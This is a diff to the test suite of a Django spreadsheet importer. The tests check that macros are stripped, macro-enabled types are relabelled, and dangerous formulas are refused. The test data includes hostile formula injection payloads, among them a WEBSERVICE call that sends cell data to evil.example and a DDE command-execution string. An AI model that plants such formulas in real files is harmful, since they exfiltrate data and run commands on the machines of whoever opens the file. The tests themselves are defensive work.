@@ -122,16 +122,22 @@ class MaliciousWorkbookTests(SimpleTestCase):
                 z.writestr(name, data)
         return SimpleUploadedFile('innocent.xlsx', out.getvalue())
 
-    def test_vba_project_inside_an_xlsx_is_refused(self):
+    def test_vba_project_inside_an_xlsx_is_removed_before_reading(self):
         f = self._repack(xlsx([HEAD, ['J1', 'Desk', 1, 'nr']]), extra={'xl/vbaProject.bin': b'\x00' * 64})
-        with self.assertRaisesMessage(WorkbookRefused, 'macros'):
-            importer.read(f)
+        data = f.read()
+        self.assertNotIn(b'vbaProject', importer._check_zip(data))
+        f.seek(0)
+        lines, _ = importer.read(f)
+        self.assertEqual([x.ref for x in lines], ['J1'])
 
-    def test_macro_enabled_content_type_is_refused(self):
-        patch = lambda d: d.replace(b'spreadsheetml.sheet.main+xml',  # noqa: E731
-                                    b'sheet.macroEnabled.main+xml')
-        f = self._repack(xlsx([HEAD, ['J1', 'Desk', 1, 'nr']]), types_patch=patch)
-        with self.assertRaisesMessage(WorkbookRefused, 'macro-enabled'):
+    def test_macro_enabled_content_type_is_relabelled_and_a_made_up_one_refused(self):
+        real = lambda d: d.replace(b'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml',  # noqa: E731
+                                   b'application/vnd.ms-excel.sheet.macroEnabled.main+xml')
+        f = self._repack(xlsx([HEAD, ['J1', 'Desk', 1, 'nr']]), types_patch=real)
+        self.assertNotIn(b'macroEnabled', importer._check_zip(f.read()))
+        made_up = lambda d: d.replace(b'spreadsheetml.sheet.main+xml', b'sheet.macroEnabled.main+xml')  # noqa: E731
+        f = self._repack(xlsx([HEAD, ['J1', 'Desk', 1, 'nr']]), types_patch=made_up)
+        with self.assertRaisesMessage(WorkbookRefused, 'recognise'):
             importer.read(f)
 
     def test_zip_bomb_refused_before_opening(self):
@@ -150,9 +156,8 @@ class MaliciousWorkbookTests(SimpleTestCase):
 
     def test_formulas_are_never_run_or_imported(self):
         def setup(ws):
-            ws['E2'] = '=WEBSERVICE("http://evil.example/"&B2)'   # a formula: no saved value
-            ws['E3'] = '=1+1'
-            ws['B4'] = '=cmd|\' /C calc\'!A0'                  # a formula in the description
+            ws['E3'] = '=1+1'                                    # a formula: no saved value
+            ws['B4'] = '=B2&" extra"'                            # a formula in the description
             ws['B5'].value = '=HYPERLINK("http://evil.example")'
             ws['B5'].data_type = 's'                             # text that merely looks like a formula
         f = xlsx([HEAD, ['J1', 'Desk', 1, 'nr'], ['J2', 'Units', 8, 'm'], ['J3', None, 1, 'nr'], ['J4', None, 1, 'nr']],
@@ -165,6 +170,14 @@ class MaliciousWorkbookTests(SimpleTestCase):
         self.assertEqual(got['J4'].description, '=HYPERLINK("http://evil.example")')  # kept as text, exported safely
         from levelling.exports import safe
         self.assertEqual(safe(got['J4'].description)[0], "'")
+
+    def test_formulas_that_fetch_or_run_something_are_refused(self):
+        for formula in ('=WEBSERVICE("http://evil.example/"&B2)', '=cmd|\' /C calc\'!A0', '=_xlfn.IMAGE("http://x.example/a.png")',
+                        '=RTD("prog.id",,"x")', '=HYPERLINK("file:///c:/x.txt")'):
+            with self.subTest(formula):
+                f = xlsx([HEAD, ['J1', 'Desk', 1, 'nr']], setup=lambda ws, formula=formula: ws.__setitem__('E2', formula))
+                with self.assertRaisesMessage(WorkbookRefused, 'cell E2'):
+                    importer.read(f)
 
     def test_sheet_claiming_huge_dimensions_reads_quickly(self):
         def setup(ws):
